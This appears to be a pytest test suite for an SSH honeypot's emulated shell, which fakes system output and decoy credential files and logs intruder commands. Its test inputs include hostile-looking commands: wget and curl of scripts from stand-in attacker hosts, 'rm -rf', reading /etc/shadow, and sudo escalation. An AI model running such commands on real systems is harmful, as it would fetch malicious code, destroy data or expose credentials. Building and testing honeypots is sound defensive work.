"""
Tests for EmulatedShell class - shell command emulation.
"""

from unittest.mock import MagicMock, patch

import pytest

import main
from main import EmulatedShell, SessionRecorder


@pytest.fixture
def shell():
    """Create an EmulatedShell instance for testing."""
    mock_channel = MagicMock()
    recorder = SessionRecorder("192.168.1.100")
    return EmulatedShell(mock_channel, "192.168.1.100", recorder)


class TestShellInitialization:
    """Tests for shell initialization."""

    def test_init_sets_default_values(self, shell):
        """Shell should initialize with correct default values."""
        assert shell.client_ip == "192.168.1.100"
        assert shell.cwd == "/home/sysadmin"
        assert shell.is_root is False
        assert shell.current_user == "sysadmin"
        assert shell.command_count == 0

    def test_init_with_recorder(self, shell):
        """Shell should have a session recorder attached."""
        assert shell.recorder is not None
        assert isinstance(shell.recorder, SessionRecorder)


class TestPrompt:
    """Tests for shell prompt generation."""

    def test_normal_user_prompt(self, shell):
        """Normal user should have $ prompt."""
        prompt = shell.get_prompt()
        assert b"$" in prompt
        assert b"sysadmin@corp-server01" in prompt

    def test_root_prompt(self, shell):
        """Root user should have # prompt."""
        shell.is_root = True
        prompt = shell.get_prompt()
        assert b"#" in prompt
        assert b"root@corp-server01" in prompt

    def test_prompt_includes_cwd(self, shell):
        """Prompt should include current working directory."""
        shell.cwd = "/var/log"
        prompt = shell.get_prompt()
        assert b"/var/log" in prompt


class TestBasicCommands:
    """Tests for basic shell commands."""

    def test_pwd_returns_cwd(self, shell):
        """pwd should return current working directory."""
        shell.cwd = "/home/sysadmin"
        result = shell.handle_command("pwd")
        assert result == "/home/sysadmin"

    def test_whoami_normal_user(self, shell):
        """whoami should return current username."""
        result = shell.handle_command("whoami")
        assert result == "sysadmin"

    def test_whoami_as_root(self, shell):
        """whoami as root should return 'root'."""
        shell.is_root = True
        result = shell.handle_command("whoami")
        assert result == "root"

    def test_hostname(self, shell):
        """hostname should return fake hostname."""
        result = shell.handle_command("hostname")
        assert result == "corp-server01"

    def test_id_normal_user(self, shell):
        """id should return user info with groups."""
        result = shell.handle_command("id")
        assert "uid=1000" in result
        assert "sysadmin" in result
        assert "sudo" in result

    def test_id_as_root(self, shell):
        """id as root should show uid=0."""
        shell.is_root = True
        result = shell.handle_command("id")
        assert "uid=0(root)" in result

    def test_uname(self, shell):
        """uname should return 'Linux'."""
        result = shell.handle_command("uname")
        assert result == "Linux"

    def test_uname_a(self, shell):
        """uname -a should return full system info."""
        result = shell.handle_command("uname -a")
        assert "Linux" in result
        assert "Ubuntu" in result or "GNU/Linux" in result

    def test_date(self, shell):
        """date should return formatted date string."""
        result = shell.handle_command("date")
        assert "UTC" in result or "202" in result  # Year

    def test_uptime(self, shell):
        """uptime should return system uptime."""
        result = shell.handle_command("uptime")
        assert "up" in result
        assert "load average" in result

    def test_exit_returns_none(self, shell):
        """exit command should return None to signal exit."""
        result = shell.handle_command("exit")
        assert result is None

    def test_logout_returns_none(self, shell):
        """logout command should return None."""
        result = shell.handle_command("logout")
        assert result is None

    def test_quit_returns_none(self, shell):
        """quit command should return None."""
        result = shell.handle_command("quit")
        assert result is None

    def test_empty_command(self, shell):
        """Empty command should return empty string."""
        result = shell.handle_command("")
        assert result == ""

    def test_unknown_command(self, shell):
        """Unknown command should return 'command not found'."""
        result = shell.handle_command("unknowncmd")
        assert "command not found" in result


class TestFileSystemCommands:
    """Tests for filesystem-related commands."""

    def test_ls_home_directory(self, shell):
        """ls in home directory should list files."""
        shell.cwd = "/home/sysadmin"
        result = shell.handle_command("ls")
        assert "Documents" in result or "notes.txt" in result

    def test_ls_with_path(self, shell):
        """ls with path should list that directory."""
        result = shell.handle_command("ls /etc")
        assert "passwd" in result

    def test_ls_hidden_files(self, shell):
        """ls -a should show hidden files."""
        shell.cwd = "/home/sysadmin"
        result = shell.handle_command("ls -a")
        assert ".bashrc" in result or ".ssh" in result

    def test_cd_to_root(self, shell):
        """cd / should change to root directory."""
        shell.handle_command("cd /")
        assert shell.cwd == "/"

    def test_cd_parent_directory(self, shell):
        """cd .. should go to parent directory."""
        shell.cwd = "/home/sysadmin"
        shell.handle_command("cd ..")
        assert shell.cwd == "/home" or shell.cwd == "/"

    def test_cd_home(self, shell):
        """cd ~ should go to home directory."""
        shell.cwd = "/var/log"
        shell.handle_command("cd ~")
        assert shell.cwd == "/home/sysadmin"

    def test_cd_no_args(self, shell):
        """cd without args should go to home."""
        shell.cwd = "/var/log"
        shell.handle_command("cd")
        assert shell.cwd == "/home/sysadmin"

    def test_cd_absolute_path(self, shell):
        """cd with absolute path should work."""
        shell.handle_command("cd /var/www/html")
        assert shell.cwd == "/var/www/html"

    def test_cd_relative_path(self, shell):
        """cd with relative path should work."""
        shell.cwd = "/home"
        shell.handle_command("cd sysadmin")
        assert shell.cwd == "/home/sysadmin"


class TestCatCommand:
    """Tests for cat command with decoy files."""

    def test_cat_passwd(self, shell):
        """/etc/passwd should return fake passwd content."""
        result = shell.handle_command("cat /etc/passwd")
        assert "root:x:0:0" in result
        assert "sysadmin" in result

    def test_cat_shadow_permission_denied(self, shell):
        """/etc/shadow should be denied for normal user."""
        result = shell.handle_command("cat /etc/shadow")
        assert "Permission denied" in result

    def test_cat_shadow_as_root(self, shell):
        """/etc/shadow should be readable as root."""
        shell.is_root = True
        result = shell.handle_command("cat /etc/shadow")
        assert "root:" in result
        assert "$6$" in result  # Password hash format

    def test_cat_hosts(self, shell):
        """/etc/hosts should return fake hosts content."""
        result = shell.handle_command("cat /etc/hosts")
        assert "127.0.0.1" in result
        assert "localhost" in result

    def test_cat_notes_txt(self, shell):
        """notes.txt should contain fake credentials."""
        result = shell.handle_command("cat notes.txt")
        assert "password" in result.lower() or "credential" in result.lower()

    def test_cat_wp_config(self, shell):
        """wp-config.php should contain fake DB credentials."""
        result = shell.handle_command("cat /var/www/html/wp-config.php")
        assert "DB_PASSWORD" in result
        assert "DB_USER" in result

    def test_cat_nonexistent_file(self, shell):
        """Nonexistent file should return error."""
        result = shell.handle_command("cat /nonexistent/file.txt")
        assert "No such file" in result

    def test_cat_missing_operand(self, shell):
        """cat without file should show error."""
        result = shell.handle_command("cat")
        assert "missing operand" in result


class TestNetworkCommands:
    """Tests for network-related commands."""

    def test_netstat(self, shell):
        """netstat should show fake connections."""
        result = shell.handle_command("netstat")
        assert "LISTEN" in result
        assert ":22" in result  # SSH port

    def test_ss_command(self, shell):
        """ss should work like netstat."""
        result = shell.handle_command("ss")
        assert "LISTEN" in result

    def test_ifconfig(self, shell):
        """ifconfig should show network interface."""
        result = shell.handle_command("ifconfig")
        assert "eth0" in result
        assert "inet" in result

    def test_df(self, shell):
        """df should show disk usage."""
        result = shell.handle_command("df")
        assert "Filesystem" in result
        assert "/dev/sda" in result

    def test_ps(self, shell):
        """ps should show processes."""
        result = shell.handle_command("ps")
        assert "PID" in result
        assert "sshd" in result

    def test_ps_aux(self, shell):
        """ps aux should show detailed process list."""
        result = shell.handle_command("ps aux")
        assert "USER" in result
        assert "mysql" in result or "apache" in result


class TestDownloadTrapping:
    """Tests for wget/curl URL trapping."""

    def test_wget_captures_url(self, shell):
        """wget should capture and log the URL."""
        with patch.object(main.downloads_logger, 'info') as mock_log:
            result = shell.handle_command("wget http://malware.com/evil.sh")

            mock_log.assert_called()
            call_args = mock_log.call_args[0][0]
            assert "http://malware.com/evil.sh" in call_args

    def test_wget_fake_success(self, shell):
        """wget should fake a successful download."""
        result = shell.handle_command("wget http://example.com/file.txt")
        assert "200 OK" in result or "saved" in result

    def test_curl_captures_url(self, shell):
        """curl should capture and log the URL."""
        with patch.object(main.downloads_logger, 'info') as mock_log:
            result = shell.handle_command("curl http://attacker.com/payload")

            mock_log.assert_called()

    def test_wget_missing_url(self, shell):
        """wget without URL should show error."""
        result = shell.handle_command("wget")
        assert "missing URL" in result

    def test_extract_urls_single(self, shell):
        """Should extract single URL from command."""
        urls = shell.extract_urls("wget http://example.com/file.sh")
        assert len(urls) == 1
        assert urls[0] == "http://example.com/file.sh"

    def test_extract_urls_https(self, shell):
        """Should extract HTTPS URLs."""
        urls = shell.extract_urls("curl https://secure.com/data")
        assert len(urls) == 1
        assert urls[0] == "https://secure.com/data"

    def test_extract_urls_multiple(self, shell):
        """Should extract multiple URLs from command."""
        urls = shell.extract_urls("wget http://a.com/1 http://b.com/2")
        assert len(urls) == 2


class TestPrivilegeEscalation:
    """Tests for sudo/su privilege escalation."""

    def test_sudo_su_escalates(self, shell):
        """sudo su should escalate to root."""
        shell.handle_command("sudo su")
        assert shell.is_root is True
        assert shell.current_user == "root"

    def test_sudo_i_escalates(self, shell):
        """sudo -i should escalate to root."""
        shell.handle_command("sudo -i")
        assert shell.is_root is True

    def test_sudo_s_escalates(self, shell):
        """sudo -s should escalate to root."""
        shell.handle_command("sudo -s")
        assert shell.is_root is True

    def test_su_escalates(self, shell):
        """su should escalate to root."""
        shell.handle_command("su")
        assert shell.is_root is True
        assert shell.cwd == "/root"

    def test_su_dash_escalates(self, shell):
        """su - should escalate to root."""
        shell.handle_command("su -")
        assert shell.is_root is True

    def test_sudo_runs_command_as_root(self, shell):
        """sudo command should run command with root privileges."""
        result = shell.handle_command("sudo cat /etc/shadow")
        assert "Permission denied" not in result
        # Should still be non-root after command
        assert shell.is_root is False

    def test_sudo_no_args(self, shell):
        """sudo without args should show usage."""
        result = shell.handle_command("sudo")
        assert "usage" in result.lower()

    def test_privilege_escalation_sends_alert(self, shell):
        """Privilege escalation should send alert."""
        with patch.object(main.alert_manager, 'send_alert') as mock_alert:
            shell.handle_command("sudo su")

            mock_alert.assert_called()
            call_args = mock_alert.call_args
            assert call_args[0][0] == "privilege_escalation"


class TestMiscCommands:
    """Tests for miscellaneous commands."""

    def test_history(self, shell):
        """history should show fake command history."""
        result = shell.handle_command("history")
        assert "ssh" in result or "ls" in result

    def test_env(self, shell):
        """env should show environment variables."""
        result = shell.handle_command("env")
        assert "USER=" in result
        assert "PATH=" in result
        assert "HOME=" in result

    def test_echo(self, shell):
        """echo should return its arguments."""
        result = shell.handle_command("echo hello world")
        assert result == "hello world"

    def test_which_common_command(self, shell):
        """which should return path for common commands."""
        result = shell.handle_command("which ls")
        assert "/usr/bin/ls" in result

    def test_which_unknown_command(self, shell):
        """which for unknown command should return empty."""
        result = shell.handle_command("which nonexistent")
        assert result == ""

    def test_rm_pretends_to_work(self, shell):
        """rm should pretend to work (return empty)."""
        result = shell.handle_command("rm -rf /important")
        assert result == ""

    def test_chmod_pretends_to_work(self, shell):
        """chmod should pretend to work."""
        result = shell.handle_command("chmod 777 file.txt")
        assert result == ""

    def test_mkdir_pretends_to_work(self, shell):
        """mkdir should pretend to work."""
        result = shell.handle_command("mkdir newdir")
        assert result == ""


class TestCommandLogging:
    """Tests for command logging functionality."""

    def test_command_increments_counter(self, shell):
        """Each command should increment command counter."""
        assert shell.command_count == 0

        shell.handle_command("ls")
        assert shell.command_count == 1

        shell.handle_command("pwd")
        assert shell.command_count == 2

    def test_command_logged_to_recorder(self, shell):
        """Commands should be logged to session recorder."""
        shell.handle_command("whoami")
        shell.handle_command("id")

        assert len(shell.recorder.commands) == 2
        assert shell.recorder.commands[0]["command"] == "whoami"
        assert shell.recorder.commands[1]["command"] == "id"
